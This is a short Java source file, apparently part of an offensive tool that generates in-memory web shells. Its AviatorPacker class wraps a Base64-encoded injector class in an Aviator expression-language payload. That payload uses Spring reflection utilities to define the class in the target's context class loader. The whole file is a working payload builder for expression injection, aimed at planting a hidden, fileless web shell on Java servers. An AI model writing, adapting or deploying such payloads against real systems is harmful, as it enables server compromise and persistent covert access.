package com.reajason.javaweb.memshell.packer.aviator;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class AviatorPacker implements Packer {
    String template = "use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('{{className}}', Base64Utils.decodeFromString('{{base64Str}}'), ReflectionUtils.invokeMethod(ClassUtils.getMethod(Class.forName('java.lang.Thread'), 'getContextClassLoader', nil), Thread.currentThread()));";

    @Override
    public String pack(GenerateResult generateResult) {
        return template.replace("{{className}}", generateResult.getInjectorClassName())
                .replace("{{base64Str}}", generateResult.getInjectorBytesBase64Str());
    }
}
